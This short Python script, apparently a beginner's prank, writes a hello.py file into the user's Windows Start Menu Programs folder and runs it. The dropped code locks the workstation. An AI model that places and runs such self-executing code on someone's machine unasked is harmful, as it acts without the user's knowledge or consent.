from os.path import expanduser
import os

ír = "import ctypes\nctypes.windll.user32.LockWorkStation()"

home= expanduser('~')
hely = home+'\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\\hello.py'   #\a hangszórót akarja megszólaltatni
print(hely)

fbe = open(hely , 'w+')
fbe.write(ír)
fbe.close()

os.startfile(hely)
